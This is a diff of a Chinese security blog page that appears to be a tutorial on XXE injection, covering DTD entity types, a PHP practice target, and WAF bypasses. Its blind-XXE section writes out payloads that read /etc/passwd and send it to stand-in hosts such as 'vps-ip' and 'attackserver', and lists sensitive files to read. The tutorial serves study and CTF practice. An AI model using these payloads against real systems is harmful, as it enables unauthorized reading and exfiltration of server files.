@@ -386,14 +386,14 @@ DTD（document type define文档类型定义）作用是定义XML文档的合法
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    496
+                    964
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    4 分
                 </div>
                 
 
@@ -430,31 +430,31 @@ DTD（document type define文档类型定义）作用是定义XML文档的合法
 </code></pre>
 </li>
 <li><p>参数实体<br>声明语法：<code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code><br>引用实体的方式：<code>%实体名;</code><br>只能在DTD中使用，只有在DTD文件中，参数实体的声明才能引用其他实体。<br>和通用实体一样，也可以外部引用。</p>
-<pre class=" language-xml-dtd"><code class="language-xml-dtd"><!ENTITY % an-element "<!ENTITY mytag (subtag)>">
-<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd">
-%an-element; %remonte-dtd;
-</code></pre>
 </li>
 </ul>
+<p><img src="https://bu.dusays.com/2022/04/06/0893692b657ce.png"></p>
 <p>还有另一种划分标准</p>
 <ul>
-<li>内部实体<br>内部声明<br>&#96;&#96;&#96;xml<?xml version="1.0"?>
-<!DOCTYPE test [
-<!ENTITY writer "Bill Gates">
-<!ENTITY copyright "Copyright W3School.com.cn">
-]&gt;</li>
+<li>内部实体<br>内部声明</li>
 </ul>
-<p><test>&amp;writer;&amp;copyright;</test></p>
-<pre><code>- 外部实体
-外部声明（引用外部DTD）
-```xml
-&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;!DOCTYPE test [
-&lt;!ENTITY writer SYSTEM &quot;http://www.example.com/123.dtd&quot;&gt;
-&lt;!ENTITY copyright SYSTEM &quot;http://www.example.com/123.dtd&quot;&gt;
-]&gt;
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE test [
+&lt;!ENTITY writer "Bill Gates"></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">copyright</span> <span class="token attr-name">"Copyright</span> <span class="token attr-name">W3School.com.cn"</span><span class="token punctuation">></span></span>
+]>
 
-&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>test</span><span class="token punctuation">></span></span><span class="token entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>test</span><span class="token punctuation">></span></span>
+</code></pre>
+<ul>
+<li>外部实体<br>外部声明（引用外部DTD）</li>
+</ul>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE test [
+&lt;!ENTITY writer SYSTEM "http://www.example.com/123.dtd"></span>
+&lt;!ENTITY copyright SYSTEM "http://www.example.com/123.dtd">
+]>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity" title="&writer;">&amp;writer;</span>&amp;copyright;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>
 </code></pre>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>练习题源代码:</p>
 <pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
@@ -498,12 +498,11 @@ bp截包,修改Content-Type: application/xml,post提交,mode=1,把这段代码�
 </code></pre>
 <p><img src="https://bu.dusays.com/2021/10/10/e230fa54fda07.png"></p>
 <h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>反弹shell<br>在云服务器上放置如下代码:</p>
-<pre class=" language-xml-dtd"><code class="language-xml-dtd"><!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://vps-ip/?file=%file;'>">
-
-http://vps/test.dtd
+<p><img src="https://bu.dusays.com/2022/04/06/82261378fde89.png"></p>
+<p>POST提交</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
+<span class="token doctype">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://vps-ip/test.dtd"></span>%remote;%int;%send;]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">/></span></span>
 </code></pre>
-<p>POST提交<br><?xml version="1.0" encoding="utf-8"?><br><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://vps-ip/test.dtd">%remote;%int;%send;]&gt;<root/></p>
 <p><img src="https://bu.dusays.com/2021/10/10/42976eacf22a2.png"></p>
 <p>开源练习题：2019NCTF-fake xml cookbook<br>           2019NCTF-true xml cookbook</p>
 <p>读文件敏感<br>&#x2F;etc&#x2F;hosts 存储域名解析的缓存<br>&#x2F;etc&#x2F;passwd 用户密码<br>&#x2F;proc&#x2F;net&#x2F;arp 每个网络接口的arp表中的dev包</p>
@@ -516,11 +515,8 @@ http://vps/test.dtd
 </li>
 </ul>
 <h3 id="文档开头检测"><a href="#文档开头检测" class="headerlink" title="文档开头检测"></a>文档开头检测</h3><p>通常xxe漏洞存在XML文档的开头，有的waf会检测文件开头，但是XML格式在设置标签属性的格式时允许使用任意数量的空格，因此我们可以在&lt;?xml ?&gt;或&lt;?DOCTYPE&gt;中插入大量的空格绕过。</p>
-<h4 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h4><p>比如一个场景回显结果都放在一个标签里，不直接输出，先xml解析，但是文本中的 &lt; 和 &amp; 等字符会干扰正常的xml parser 然后报错，这是就需要用到CDATA。CDATA 区段（CDATA section）中的文本会被解析器忽略。<br>&lt;?[CDATA[ ANYTHING_HERE ]]&gt;</p>
-<pre class=" language-xml-dtd"><code class="language-xml-dtd"><!ENTITY filecontent "&#x3c;&#x21;&#x5b;&#x43;&#x44;&#x41;&#x54;&#×41;&#x5b; %content;&#x5d;&#x5d;&#×3e;" >
-
-<!ENTITY filecontent "<![CDATA[ %content; ]]>" >的html编码
-</code></pre>
+<h4 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h4><p>比如一个场景回显结果都放在一个标签里，不直接输出，先xml解析，但是文本中的 &lt; 和 &amp; 等字符会干扰正常的xml parser 然后报错，这是就需要用到CDATA。CDATA 区段（CDATA section）中的文本会被解析器忽略。<br>&lt;![CDATA[ ANYTHING_HERE ]]&gt;</p>
+<p><img src="https://bu.dusays.com/2022/04/06/3cd60f4b35e35.png"></p>
 <p>提交</p>
 <pre class=" language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE root [ &lt;!ENTITY % content SYSTEM "file:///etc/passwd"></span>
 &lt;!ENTITY % dtd SYSTEM "http://attackserver/readillegal.dtd"
@@ -719,7 +715,11 @@ http://vps/test.dtd
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%B8%8A%E4%BC%A0/" class="post-category">
+                            <a href="/categories/php/" class="post-category">
+                                    php
+                                </a>
+                            
+                            <a href="/categories/php/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%B8%8A%E4%BC%A0/" class="post-category">
                                     文件包含&上传
                                 </a>
                             
@@ -729,6 +729,10 @@ http://vps/test.dtd
                 </div>
                 
                 <div class="card-action article-tags">
+                    
+                    <a href="/tags/php/">
+                        <span class="chip bg-color">php</span>
+                    </a>
                     
                     <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%B8%8A%E4%BC%A0/">
                         <span class="chip bg-color">文件包含&amp;上传</span>
@@ -918,7 +922,7 @@ http://vps/test.dtd
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">21.6k</span>
+                        class="white-color">22.6k</span>
             
             
             
